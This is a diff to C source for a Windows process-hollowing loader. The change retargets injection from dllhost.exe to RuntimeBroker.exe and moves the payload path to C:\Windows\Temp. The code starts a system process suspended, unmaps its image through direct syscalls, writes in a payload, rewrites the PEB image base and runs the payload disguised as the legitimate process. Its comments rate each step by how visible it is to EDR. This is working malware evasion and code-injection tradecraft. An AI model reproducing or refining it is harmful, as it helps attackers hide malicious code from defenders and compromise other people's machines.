@@ -286,16 +286,16 @@ static DWORD RunHollowCore(LPBYTE payload, DWORD payloadSize) {
     printf("%s Entry point RVA: 0x%X\n\n", k,
            ntHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    // ── 1. Launch dllhost suspended — WinAPI (not a hot EDR target) ───
-    printf("%s Launching dllhost.exe suspended...\n", i);
+    // ── 1. Launch target suspended — WinAPI ───────────────────────────
+    printf("%s Launching RuntimeBroker.exe suspended...\n", i);
 
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
     if (!CreateProcessA(
-        "C:\\Windows\\System32\\dllhost.exe",
-        (LPSTR)"/Processid:{00000000-0000-0000-0000-000000000000}",
+        "C:\\Windows\\System32\\RuntimeBroker.exe",
+        NULL,
         NULL, NULL, FALSE,
         CREATE_SUSPENDED,
         NULL, NULL, &si, &pi
@@ -335,28 +335,28 @@ static DWORD RunHollowCore(LPBYTE payload, DWORD payloadSize) {
     ULONG returnLen = 0;
     NtQPI(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);
 
-    LPVOID pebAddress = pbi.PebBaseAddress;
-    printf("%s PEB: 0x%p\n", k, pebAddress);
+    LPVOID pebAddr = pbi.PebBaseAddress;
+    printf("%s PEB: 0x%p\n", k, pebAddr);
 
-    LPVOID dllhostImageBase = NULL;
+    LPVOID targetImageBase = NULL;
     ReadProcessMemory(
         pi.hProcess,
-        (LPBYTE)pebAddress + 0x10,
-        &dllhostImageBase,
+        (LPBYTE)pebAddr + 0x10,
+        &targetImageBase,
         sizeof(LPVOID), NULL
     );
-    printf("%s Dllhost image base: 0x%p\n\n", k, dllhostImageBase);
+    printf("%s Target image base: 0x%p\n\n", k, targetImageBase);
 
     // ── 4. Unmap dllhost — DIRECT SYSCALL ─────────────────────────────
     printf("%s Unmapping dllhost via NtUnmapViewOfSection...\n", i);
 
-    status = Syscall_NtUnmapViewOfSection(pi.hProcess, dllhostImageBase);
+    status = Syscall_NtUnmapViewOfSection(pi.hProcess, targetImageBase);
     if (status != 0) {
         printf("%s NtUnmapViewOfSection failed: 0x%X\n", e, status);
         TerminateProcess(pi.hProcess, 1);
         return 0;
     }
-    printf("%s Dllhost unmapped — process is hollow\n\n", k);
+    printf("%s Target unmapped — process is hollow\n\n", k);
 
     // ── 5. Allocate memory — DIRECT SYSCALL ───────────────────────────
     printf("%s Allocating via NtAllocateVirtualMemory...\n", i);
@@ -440,7 +440,7 @@ static DWORD RunHollowCore(LPBYTE payload, DWORD payloadSize) {
     // ── 9. Update PEB ImageBase — WinAPI write (low risk) ─────────────
     WriteProcessMemory(
         pi.hProcess,
-        (LPBYTE)pebAddress + 0x10,
+        (LPBYTE)pebAddr + 0x10,
         &allocBase,
         sizeof(PVOID), NULL
     );
@@ -473,7 +473,7 @@ static DWORD RunHollowCore(LPBYTE payload, DWORD payloadSize) {
         return 0;
     }
 
-    printf("%s Hollowing complete — payload running inside dllhost.exe PID %d\n",
+    printf("%s Hollowing complete — payload running inside RuntimeBroker.exe PID %d\n",
            k, pi.dwProcessId);
 
     DWORD hollowedPid = pi.dwProcessId;
@@ -487,10 +487,10 @@ DWORD RunHollowPipelineFromBuffer(LPBYTE buf, DWORD size) {
     return RunHollowCore(buf, size);
 }
 
-// Public: reads payload from C:\Users\Public\payload.exe
+// Public: reads payload from C:\Windows\Temp\payload.exe (writable by all users)
 DWORD RunHollowPipeline() {
     DWORD payloadSize = 0;
-    LPBYTE payload = ReadPayloadFromDisk("C:\\Users\\Public\\payload.exe", &payloadSize);
+    LPBYTE payload = ReadPayloadFromDisk("C:\\Windows\\Temp\\payload.exe", &payloadSize);
     if (!payload) return 1;
     DWORD result = RunHollowCore(payload, payloadSize);
     free(payload);
